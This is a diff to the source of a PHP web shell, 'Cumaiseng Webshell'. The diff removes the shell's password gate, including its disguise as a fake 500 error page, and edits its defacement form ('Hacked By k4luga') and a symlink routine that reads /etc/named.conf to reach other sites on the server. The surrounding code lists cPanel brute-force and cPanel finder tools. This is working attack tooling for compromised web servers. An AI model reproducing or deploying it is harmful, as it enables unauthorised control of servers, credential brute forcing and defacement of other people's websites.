@@ -9,50 +9,11 @@ error_reporting(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-date_default_timezone_set("Asia/Jakarta");
-$auth_pass = "0a8e2a4233deac4814def868b44d5f25";
-
-function login() { 
-$cumaiseng ="<html><head><title>Cumaiseng Shell</title><link rel='shortcut icon' href='http://www.cumaiseng.org/assets/images/music.png'></head>";
-$cumaiseng.="<font color=green>cumaiseng@".$_SERVER['HTTP_HOST']." :~$ sudo su</font>";
-$cumaiseng.="<form method='POST'><label for='pass'><font color=green>[ sudo ] password for cumaiseng: </label><input type='password' name='pass' style='border:0;color:transparent;width:120px;background-color:transparent;'></form>";
-$cumaiseng.="</html>";   
-if(empty($_GET['auth']=="pass")){
-echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html>
-<head>
-<title>500 Internal Server Error</title>
-</head>
-<body>
-<h1>Internal Server Error</h1>
-<p>The server encountemaroon an internal error or
-misconfiguration and was unable to complete
-your request.</p>
-<p>Please contact the server administrator at 
- webmaster@'.$_SERVER['HTTP_HOST'].' to inform them of the time this error occurmaroon,
- and the actions you performed just before this error.</p>
-<p>More information about this error may be available
-in the server error log.</p>
-<p>Additionally, a 500 Internal Server Error
-error was encountemaroon while trying to use an ErrorDocument to handle the request.</p><hr>
-<address>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>
-';
-}else{
-	echo $cumaiseng;
-	echo "<body style='background-color:black'>";
-}
-exit;
-}
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
-    if(empty($auth_pass) || ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass))) 
-    $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
-    else 
-       login();
+@date_default_timezone_set("Asia/Jakarta");
 ?>
 <html>
 <head>
 <title>Cumaiseng Webshell</title>
-<script src="https://cumaiseng.github.io/assets/titip.js"></script>
 <link rel="shortcut icon" href="http://www.cumaiseng.org/assets/images/music.png"/>
 <link rel="stylesheet" href="https://cumaiseng.github.io/assets/titip.css"/>
 </head>
@@ -774,7 +735,7 @@ echo"</textarea><br><br>";
 		<font style='text-decoration: underline;'>Filename:</font><br>
 		<input type='text' name='d_file' value='k.php' style='width: 450px;' height='10'><br>
 		<font style='text-decoration: underline;'>Index File:</font><br>
-		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By k4luga</textarea><br>
+		<textarea name='script' placeholder='Hacked By k4luga' style='width:450px; height:200px;'></textarea><br>
 		<input type='submit' name='start' value='>>' style='width: 450px;'>
 		</form></center>";
 		}
@@ -1117,7 +1078,7 @@ elseif($_GET['do'] == 'cpcrack') {
 	echo "<h2>.: cPanel Tools :.</h2>";
 	echo "<li>[<a href='?dir=$dir&do=cpanel'> cPanel Brute Force </a>]</li><li>[<a href='?dir=$dir&do=cpfinder'> Auto cPanel Finder </a>]</li>";
 }elseif($_GET['do'] == 'symserver') {
-$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
+$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
 $d0mains = @file("/etc/named.conf");
 if($d0mains){
 @mkdir("iseng_sym",0777);
